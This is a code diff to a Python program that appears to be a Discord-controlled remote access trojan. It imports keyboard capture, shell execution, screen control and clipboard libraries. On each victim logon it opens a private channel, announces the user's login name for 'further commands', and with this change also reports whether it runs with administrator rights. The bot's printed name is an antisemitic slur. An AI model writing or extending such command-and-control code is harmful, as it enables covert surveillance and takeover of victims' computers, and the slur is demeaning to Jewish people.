@@ -5,6 +5,7 @@ from pynput import keyboard
 import subprocess
 import webbrowser
 import pyautogui
+import PyElevate
 import pyperclip
 import datetime
 import platform
@@ -404,7 +405,7 @@ async def on_ready():
         channel_name = bot_channel()
         existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
         logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")
-
+                    
         if existing_channel is None:
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -412,10 +413,10 @@ async def on_ready():
             }
             new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
             await new_channel.edit(topic=logon_date)
-            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
+            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ""}")
         else:
             await existing_channel.edit(topic=logon_date)
-            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
+            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ""}")
         in_server_ammount += 1
             
     print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')
